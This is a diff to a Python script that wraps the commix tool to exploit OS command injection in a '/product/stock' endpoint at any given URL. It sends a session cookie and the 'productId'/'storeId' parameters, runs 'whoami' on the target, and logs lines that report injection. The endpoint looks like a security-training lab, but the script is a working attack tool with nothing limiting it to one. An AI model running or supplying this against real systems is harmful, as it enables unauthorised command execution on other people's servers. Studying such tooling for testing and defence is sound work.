@@ -14,7 +14,7 @@ full_url = f"{url if url[-1] != '/' else url[:-1]}/product/stock"
 command = [
     "python3", "commix.py",
     "--url", full_url,
-    "--cookie", f'session="{session_id}"',
+    "--cookie", f'session={session_id}',
     "-d", "productId=1&storeId=1",
     "--batch",
     "--os-cmd", "whoami"
@@ -22,37 +22,26 @@ command = [
 
 print("Executing command: ", " ".join(command))
 
-# Start the process with pexpect
-child = pexpect.spawn(" ".join(command), timeout=120)  # Increased timeout
+child = pexpect.spawn(" ".join(command), timeout=120)
 
-# Attach a logfile to capture all output for debugging
-child.logfile = open("pexpect_log.txt", "wb")
+output_lines = []
 
-# Loop to handle intermediate prompts
 while True:
     try:
         index = child.expect([pexpect.EOF, pexpect.TIMEOUT])
-        if index == 0:  # EOF reached, command completed
+        if index == 0:
             break
-        elif index == 1:  # Timeout
+        elif index == 1:
             print("Timeout waiting for command to complete.")
             break
     except pexpect.exceptions.TIMEOUT:
         print("Command took too long, exiting.")
         break
 
-# Capture the output
-output = child.before.decode()
+output = child.before.decode().splitlines()
 
-# Print the output
-print(output)
-
-# Save the output to file
 with open("output.txt", "w", encoding='utf-8') as output_file:
     output_file.write(f"Affected URL : {full_url}\n")
-    output_file.write(output)
-
-# Check for specific words in the output
-if "injectable" in output.lower() or "injection" in output.lower():
-    with open("output.txt", "a", encoding='utf-8') as output_file:
-        output_file.write("Detected potential injection vulnerability.\n")
+    for line in output:
+        if "injectable" in line.lower() or "injection" in line.lower():
+            output_file.write(line + "\n")
